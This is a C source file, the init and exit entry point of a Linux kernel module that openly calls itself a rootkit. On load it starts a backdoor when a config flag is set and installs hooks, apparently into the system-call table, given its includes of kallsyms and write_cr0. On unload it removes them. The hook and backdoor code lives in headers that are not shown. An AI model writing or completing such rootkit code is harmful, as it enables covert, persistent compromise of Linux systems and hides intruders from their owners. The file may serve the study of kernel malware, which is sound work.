#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0

#include "config.h"
#include "hooks.h"
#include "backdoor.h"

//insmod
static int lkm_init(void){
    printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
	if (BACKDOOR) start_backdoor();
    return hooks();
}

//rmmod
static void lkm_exit(void){
    printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
	unhooks();
	if (BACKDOOR) stop_backdoor();
}

module_init(lkm_init);
module_exit(lkm_exit);

